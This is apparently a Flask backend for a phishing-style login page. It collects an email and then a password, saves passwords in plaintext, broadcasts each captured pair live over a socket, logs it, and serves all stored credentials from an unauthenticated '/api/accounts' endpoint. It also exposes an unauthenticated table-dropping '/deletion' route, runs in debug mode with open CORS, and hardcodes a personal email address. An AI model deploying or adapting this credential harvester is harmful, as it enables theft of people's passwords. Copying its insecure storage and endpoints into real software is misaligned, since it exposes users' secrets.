from flask import Flask, redirect, url_for, request, render_template, make_response, jsonify
import sqlite3
from flask_socketio import SocketIO, emit

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

@app.route("/")
def main():
    return render_template("index.html")

@app.route("/next", methods=['POST', 'GET'])
def next():
    if request.method == 'POST':
        email = request.form["email"]
        return render_template("next.html", email=email)
    else:
        return render_template("next.html", email="You aren't supposed to do that")

@app.route("/consequenceofactions", methods=["POST", "GET"])
def yaai():
    if request.method == 'POST':
        # email = request.form["email"]
        email = "sjungxuan@gmail.com"
        password = request.form["password"]
        with sqlite3.connect("./data/database.db") as con:
            cur = con.cursor()
            cur.execute("""
            INSERT INTO Account (Email, Password)
            VALUES (?, ?)      
            """, (email, password,))
            con.commit()
            id = cur.lastrowid

        socketio.emit("new_acc", {'id': id, 'email': email, 'password': password})
        print(f"[LOG] New Account - ID: {id}, Email: {email}, Password: {password}")

        return render_template("yaai.html", email=email, password=password)
    else:
        return "You're not supposed to do that"
    
@app.route("/api/accounts")
def get_accounts():
    with sqlite3.connect("./data/database.db") as con:
        cur = con.cursor()
        cur.execute("SELECT ID, Email, Password FROM Account")
        rows = cur.fetchall()
        accounts = [{"id": row[0], "email": row[1], "password": row[2]} for row in rows]
        return jsonify({"accounts": accounts})

@app.route('/creation')
def creation():
    with sqlite3.connect("./data/database.db") as con:
        con.execute("""
        CREATE TABLE IF NOT EXISTS "Account" (
        "ID"	INTEGER NOT NULL,
        "Email"	TEXT NOT NULL,
        "Password"	TEXT NOT NULL,
        PRIMARY KEY("ID" AUTOINCREMENT)
        );
        """)
        con.commit()
    
    return "Successful Initialization of Database: Account!"

@app.route('/deletion')
def deletion():
    with sqlite3.connect("./data/database.db") as con:
        con.execute("""
        DROP TABLE "Account";
        """)
        con.commit()
    return "Successful Deletion of Database: Account!"



if __name__ == "__main__":
    socketio.run(app, debug=True)

